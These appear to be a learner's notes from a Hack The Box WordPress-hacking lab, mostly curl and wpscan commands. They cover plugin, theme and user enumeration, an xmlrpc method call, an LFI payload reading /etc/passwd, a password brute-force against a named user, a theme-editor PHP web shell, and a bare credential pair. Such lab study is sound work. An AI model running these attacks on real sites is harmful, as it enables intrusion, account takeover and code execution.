# Hacking WordPress

# Plugins and Themes Enumeration

https://wpscan.com/profile/

```bash

# Plugins
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2

# Themes
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2


curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta

curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/someplugin


```

# Directory Indexing


Keep in mind the key WordPress directories discussed in the WordPress Structure section. Manually enumerate the target for any directories whose contents can be listed. Browse these directories and locate a flag with the file name flag.txt and submit its contents as the answer. 


```bash
curl -s -X GET http://94.237.53.113:54640/wp-content/plugins/mail-masta/ | html2text  


curl -s -X GET http://94.237.53.113:54640/wp-content/plugins/mail-masta/inc/flag.txt | html2text


```

# User Enumeration


```bash

curl -s -I http://blog.inlanefreight.com/?author=1

curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq

``` 



# Login

Search for "WordPress xmlrpc attacks" and find out how to use it to execute all method calls. Enter the number of possible method calls of your target as the answer. 

```bash

curl -X POST -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' http://94.237.53.113:54640/xmlrpc.php  | grep "string" | wc -l


```


# Exploiting a Vulnerable Plugin


```bash
view-source:http://94.237.63.49:39931/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

```


# Attacking WordPress Users


```bash
wpscan --password-attack xmlrpc -t 20 -U roger -P /usr/share/wordlists/rockyou.txt  --url http://94.237.63.49:39931


```


# Remote Code Execution (RCE) via the Theme Editor


```php

system($_GET['cmd']);
readfile("/home/wp-user/flag.txt");

```

# WordPress Hardening

Perform Regular Updates

https://academy.hackthebox.com/module/17/section/63


```
erika:010203

```
